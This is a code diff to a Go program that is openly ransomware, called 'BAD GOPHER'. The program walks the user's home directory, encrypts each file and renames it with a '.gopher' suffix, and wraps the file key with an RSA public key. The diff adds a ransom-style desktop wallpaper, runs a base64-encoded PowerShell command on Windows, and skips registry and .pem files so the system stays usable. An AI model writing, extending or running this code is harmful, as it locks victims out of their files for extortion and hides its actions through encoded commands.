@@ -9,15 +9,20 @@ import (
 	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/x509"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/pem"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"time"
+
+	"github.com/reujab/wallpaper"
 )
 
 // Compresses one or many files into a single zip archive file.
@@ -134,6 +139,25 @@ func main() {
 	// use CLI. Store in this binary with https://github.com/markbates/pkger and
 	// extract onto the user's desktop when done.
 
+	home, _ := os.UserHomeDir()
+	home = home + "/"
+
+	desktopBackgroundPng, _ := base64.StdEncoding.DecodeString(desktopBackground)
+	f, _ := os.Create(home + "BAD_GOPHER.jpg")
+	defer f.Close()
+	f.Write(desktopBackgroundPng)
+
+	err := wallpaper.SetFromFile(home + "BAD_GOPHER.jpg")
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command("powershell", "-EncodedCommand", wallpaperCmdString)
+		defer cmd.Start()
+		defer cmd.Wait()
+	}
+
 	magicBytes := []byte("BAD GOPHER\n")
 	currentTime := []byte(time.Now().UTC().String() + "\n")
 	// decryptPtr := flag.Bool("decrypt", false, "decrypt with given key")
@@ -150,7 +174,6 @@ func main() {
 	// Encrypt the symmetric key with the asymmetric public key
 	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)
 
-	home, _ := os.UserHomeDir()
 	keyFilePath := home + "/BAD_GOPHER.txt"
 
 	// Check if key file exists, if so exit program b/c already encrypted
@@ -167,11 +190,9 @@ func main() {
 	fmt.Printf("Ciphertext: %s\n", hex.EncodeToString(ciphertext))
 
 	const suffix = ".gopher"
-	startingDirectory, _ := os.UserHomeDir()
-	startingDirectory = startingDirectory + "/"
 
 	// Go through every file in the starting directory and encrypt it
-	filepath.Walk(startingDirectory, func(path string, info os.FileInfo, err error) error {
+	filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
 		}
@@ -206,7 +227,17 @@ func main() {
 		}
 
 		// Don't encrypt the decryption key file
-		if strings.Contains(info.Name(), "BAD_GOPHER") {
+		if strings.Contains(strings.ToLower(info.Name()), "bad_gopher") {
+			return nil
+		}
+
+		// Don't encrypt registry files
+		if strings.Contains(strings.ToLower(info.Name()), "ntuser") {
+			return nil
+		}
+
+		// Don't encrypt key files
+		if strings.Contains(strings.ToLower(info.Name()), ".pem") {
 			return nil
 		}
 
@@ -218,4 +249,6 @@ func main() {
 
 		return nil
 	})
+
+	fmt.Println("Finished")
 }
